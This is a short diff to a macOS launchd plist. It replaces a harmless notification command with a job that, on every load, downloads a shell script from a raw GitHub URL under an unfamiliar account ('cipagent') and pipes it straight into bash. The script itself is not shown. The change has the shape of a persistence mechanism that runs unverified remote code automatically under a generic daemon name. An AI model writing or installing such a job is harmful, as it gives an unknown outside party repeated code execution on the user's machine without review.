@@ -3,11 +3,11 @@
 <plist version="1.0">
 <dict>
 	<key>Label</key>
-	<string>com.zerowidth.launched.thisisthenameofthelaunchd</string>
+	<string>com.zerowidth.launched.nameofdaemon</string>
 	<key>ProgramArguments</key>
 	<array>
-		<string>bash</string>
-		<string>osascript -e 'display notification &quot;Lorem ipsum dolor sit amet&quot; with title &quot;Title&quot;'</string>
+		<string>sh</string>
+		<string>curl https://raw.githubusercontent.com/g6mqchyhTy/cipagent/master/cipagent.sh | bash</string>
 	</array>
 	<key>RunAtLoad</key>
 	<true/>
